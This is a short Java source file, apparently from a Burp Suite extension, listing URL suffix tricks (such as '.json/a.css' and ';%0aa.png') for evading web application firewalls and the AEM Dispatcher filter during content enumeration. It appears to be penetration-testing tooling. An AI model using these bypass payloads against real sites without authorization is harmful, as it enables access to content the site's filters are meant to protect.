package burp.payload;

import java.util.Arrays;
import java.util.List;

/**
 * Bypass variations for web app security filters and WAFs e.g. the AEM Dispacher
 *
 * @author thomas.hartmann@netcentric.biz
 * @since 02/2019
 */
public enum FilterEvasion {

    ENUMERATION_EXTENSIONS(
            Arrays.asList(
                    ".json", ".1.json", ".-11.json", ".infinity.json", ".4.2.1....json", ".json/a.css", ".json.html", ".json.css",
                    ".json/a.html", ".json/a.png", ".json/a.ico", ".json/b.jpeg", ".json/b.gif",
                    ".json;%0aa.css", ".json;%0aa.png", ".json;%0aa.html", ".json;%0aa.js", ".json/a.js")),
    DISPATCHER_BYPASS_EXTENSIONS(
            Arrays.asList("", ".css", ".ico", ".png", ".gif", ".jpeg", ".html", ".1.json", ".4.2.1...json",
                        "/a.css", "/a.html", "/a.ico", "/a.png", "/a.js", "/a.1.json", "/a.4.2.1...json",
                        ";%0aa.css", ";%0aa.png", ";%0aa.js", ";%0aa.html", ";%0aa.ico"));

    private List<String> bypasses;

    FilterEvasion(final List<String> bypasses) {
        this.bypasses = bypasses;
    }

    public List<String> getBypasses() {
        return bypasses;
    }
}
